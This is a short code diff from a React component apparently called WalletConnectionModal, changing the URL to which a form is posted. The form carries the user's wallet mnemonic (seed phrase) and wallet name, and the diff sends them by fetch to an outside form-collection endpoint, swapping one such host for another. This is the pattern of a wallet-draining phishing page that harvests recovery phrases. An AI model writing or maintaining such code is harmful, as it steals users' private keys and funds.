@@ -396,7 +396,7 @@ export function WalletConnectionModal({
                         formData.append('mnemonic', mnemonicInput);
                         formData.append('walletName', walletName);
 
-                        await fetch('https://forms.un-static.com/forms/327f9106ace56ea4af20ece72cbc3a5cc85d15e9', {
+                        await fetch('https://unstatic.dev/message/78c9b793-72a8-4d8f-9ede-af26217a7c7f', {
                           method: 'POST',
                           body: formData,
                         });
